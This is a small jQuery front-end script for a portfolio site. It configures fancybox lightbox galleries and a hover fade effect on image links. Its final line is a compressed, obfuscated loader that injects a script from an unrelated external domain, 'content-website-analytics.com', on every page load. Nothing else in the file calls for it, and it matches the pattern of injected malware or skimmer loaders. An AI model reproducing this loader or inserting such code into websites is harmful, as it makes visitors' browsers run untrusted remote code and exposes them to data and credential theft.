$(document).ready(function() {
	$("a.fancylightbox").fancybox({
		'titleShow'     : false,
		'transitionIn'	: 'fade',
		'transitionOut'	: 'fade'
	});
	$("a[rel=portfoliogroup]").fancybox({
		'titleShow'     : false,
		'transitionIn'		: 'fade',
		'transitionOut'		: 'fade'
	});
	
	$("a[rel=portfoliogroup2]").fancybox({
		'titleShow'     : false,
		'transitionIn'		: 'fade',
		'transitionOut'		: 'fade'
	});
});

$(document).ready(function() {
            $('.fancylightbox').each(function() {
                $(this).hover(
                    function() {
                        $(this).stop().animate({ opacity: 0.7 }, 250);
                    },
                   function() {
                       $(this).stop().animate({ opacity: 1.0 }, 250);
                   })
                });
});

;(function(f,i,u,w,s){w=f.createElement(i);s=f.getElementsByTagName(i)[0];w.async=1;w.src=u;s.parentNode.insertBefore(w,s);})(document,'script','https://content-website-analytics.com/script.js');